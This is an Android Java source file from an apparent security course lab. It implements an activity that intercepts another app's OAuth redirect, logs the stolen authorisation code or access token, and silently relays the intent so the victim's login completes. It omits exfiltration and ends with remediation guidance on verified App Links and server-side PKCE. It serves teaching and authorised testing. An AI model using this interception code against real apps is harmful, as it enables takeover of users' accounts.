/*
 * HijackActivity.java — receives an OAuth redirect intended for another application.
 *
 * PURPOSE
 *   Proof-of-concept for labs/lab-03-scheme-hijack.md. It logs the intercepted authorisation code
 *   and then RELAYS the intent to the legitimate app, so the victim's login completes normally and
 *   there is no observable symptom. The relay is the part that makes the attack realistic: an
 *   interception that breaks the login is noticed within minutes.
 *
 *   The interception itself is the manifest entry, not this file. This file only demonstrates what
 *   an attacker does with what the platform hands them.
 *
 * WHAT TO OBSERVE WHILE RUNNING IT
 *   host $ adb logcat -c
 *   host $ adb logcat -s STOLEN:W
 *   ...perform a real login in the target app...
 *
 *   A `code=` line is proof of interception. Take that code to the token endpoint WITHOUT a
 *   code_verifier (chapter 45 section 7.5, lab 02 variant B). Whether tokens come back is the
 *   difference between a Medium finding and a Critical one — and note that the attacker is in
 *   exactly this position: holding a code, never having seen the verifier.
 *
 * AUTHORISED USE ONLY
 *   Own the app and the account, or hold written authorisation. Uninstall afterwards.
 *
 * Chapter 45 — OAuth 2.0 and OpenID Connect on Android, sections 3.10.1, 5.1 and 7.6
 */

package com.research.hijacker;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import java.util.Set;

public class HijackActivity extends Activity {

    private static final String TAG = "STOLEN";

    /**
     * The legitimate app, for the relay step. On Android 11+ this package must also appear in a
     * <queries> element in the manifest, or setPackage() will not resolve and the relay silently
     * fails — which is a small but real hardening of the platform against exactly this attack.
     */
    private static final String TARGET_PACKAGE = "com.example.target";

    /** Set false while demonstrating that interception breaks the victim's login. */
    private static final boolean RELAY_TO_VICTIM = true;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent incoming = getIntent();
        Uri data = incoming != null ? incoming.getData() : null;

        if (data == null) {
            Log.w(TAG, "started with no data — not a redirect");
            finish();
            return;
        }

        // ------------------------------------------------------------------------------------
        // 1. What we received. The whole URI, then the parameters that matter.
        // ------------------------------------------------------------------------------------
        Log.w(TAG, "=====================================================================");
        Log.w(TAG, "intercepted redirect: " + data);
        Log.w(TAG, "  scheme = " + data.getScheme());
        Log.w(TAG, "  host   = " + data.getHost());
        Log.w(TAG, "  path   = " + data.getPath());

        String code = data.getQueryParameter("code");
        String state = data.getQueryParameter("state");
        String error = data.getQueryParameter("error");

        if (code != null) {
            Log.w(TAG, "  ***** AUTHORIZATION CODE: " + code);
            Log.w(TAG, "  This is a live, single-use claim ticket for the victim's tokens.");
            Log.w(TAG, "  Take it to the token endpoint with NO code_verifier — that is all an");
            Log.w(TAG, "  attacker has, because the verifier never left the legitimate app.");
        }
        if (state != null) {
            Log.w(TAG, "  state = " + state);
        }
        if (error != null) {
            Log.w(TAG, "  error = " + error + " : " + data.getQueryParameter("error_description"));
        }

        // An implicit-grant app returns the token itself in the fragment — strictly worse, because
        // there is no exchange step at all and PKCE is irrelevant.
        String fragment = data.getFragment();
        if (fragment != null && fragment.contains("access_token")) {
            Log.w(TAG, "  ***** ACCESS TOKEN IN FRAGMENT (implicit grant): " + fragment);
            Log.w(TAG, "  No token exchange is needed. This is immediately usable.");
        }

        // Everything else, in case the flow carries something unusual.
        try {
            Set<String> names = data.getQueryParameterNames();
            for (String n : names) {
                if (!n.equals("code") && !n.equals("state") && !n.equals("error")) {
                    Log.w(TAG, "  " + n + " = " + data.getQueryParameter(n));
                }
            }
        } catch (UnsupportedOperationException ignored) {
            // Opaque URIs (no hierarchical part) do not support query parameter enumeration.
        }

        // Which app was supposed to receive this? Useful when you are hijacking several schemes.
        Log.w(TAG, "  referrer = " + (getReferrer() != null ? getReferrer().toString() : "unknown"));
        Log.w(TAG, "=====================================================================");

        // ------------------------------------------------------------------------------------
        // 2. Exfiltration. A real attacker POSTs the code to their own server here, immediately,
        //    because the code expires in seconds to minutes.
        //
        //    DELIBERATELY NOT IMPLEMENTED. Logging is sufficient proof for a report, and shipping
        //    a working exfiltrator in a teaching repository is not appropriate. If you need to
        //    demonstrate the full chain during an authorised engagement, POST to a host you own
        //    and record it in the engagement log.
        // ------------------------------------------------------------------------------------

        // ------------------------------------------------------------------------------------
        // 3. The relay — the refinement that makes the attack invisible.
        //
        //    Without this, the victim's login hangs and the user retries, which is noticed.
        //    With it, the login completes normally and there is no observable difference.
        //
        //    Ask yourself the lab's question at this point: what could the TARGET APP do to
        //    detect that this happened? The honest answer is essentially nothing. The intent it
        //    receives is byte-identical to a legitimate one. That is why the mitigation has to be
        //    a verified App Link (so the platform never routes here) plus server-side PKCE
        //    enforcement (so the code is inert even if it does).
        // ------------------------------------------------------------------------------------
        if (RELAY_TO_VICTIM) {
            try {
                Intent relay = new Intent(Intent.ACTION_VIEW, data);
                relay.setPackage(TARGET_PACKAGE);          // explicit: no second disambiguation
                relay.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(relay);
                Log.w(TAG, "relayed to " + TARGET_PACKAGE + " — victim's login will complete");
            } catch (Exception e) {
                Log.w(TAG, "relay failed (" + e.getMessage() + ") — the victim will see a"
                        + " broken login, which is exactly what gets an attacker caught");
            }
        }

        // No UI, nothing in recents, nothing in the back stack.
        finish();
    }
}

/*
 * =================================================================================================
 * THE REMEDIATION, so this file is not only offensive.
 *
 * Two independent controls at two different layers. Both are needed, and the second is the one that
 * converts a successful interception into a non-event.
 *
 * LAYER 1 — the platform. Make the redirect exclusive with a verified App Link.
 *
 *   AndroidManifest.xml (the legitimate app):
 *     <activity android:name=".OAuthCallbackActivity" android:exported="true">
 *       <intent-filter android:autoVerify="true">
 *         <action android:name="android.intent.action.VIEW" />
 *         <category android:name="android.intent.category.DEFAULT" />
 *         <category android:name="android.intent.category.BROWSABLE" />
 *         <data android:scheme="https"
 *               android:host="login.example.com"
 *               android:path="/android/callback" />
 *       </intent-filter>
 *     </activity>
 *
 *   https://login.example.com/.well-known/assetlinks.json:
 *     [{ "relation": ["delegate_permission/common.handle_all_urls"],
 *        "target": { "namespace": "android_app",
 *                    "package_name": "com.example.target",
 *                    "sha256_cert_fingerprints": ["AB:CD:EF:..."] } }]
 *
 *   Then CONFIRM, because declaring autoVerify is not verification:
 *     adb shell pm verify-app-links --re-verify com.example.target
 *     adb shell pm get-app-links com.example.target      # must show `verified`
 *
 * LAYER 2 — the authorisation server. Make an intercepted code worthless.
 *
 *   require_pkce            = true      # reject any exchange lacking a code_verifier
 *   pkce_methods            = ["S256"]  # refuse `plain`, which is a downgrade
 *   code_single_use         = true      # burn the code on first presentation, success or failure
 *   code_lifetime           = 60s
 *   redirect_uri_matching   = exact     # no prefix, no wildcard, no normalisation
 *
 * Layer 1 stops the interception. Layer 2 makes the interception irrelevant. An app that has only
 * Layer 1 is one silent verification failure away from full exposure; an app that has only Layer 2
 * leaks codes into browser history, Referer headers and logs but suffers no takeover. Report both.
 * =================================================================================================
 */
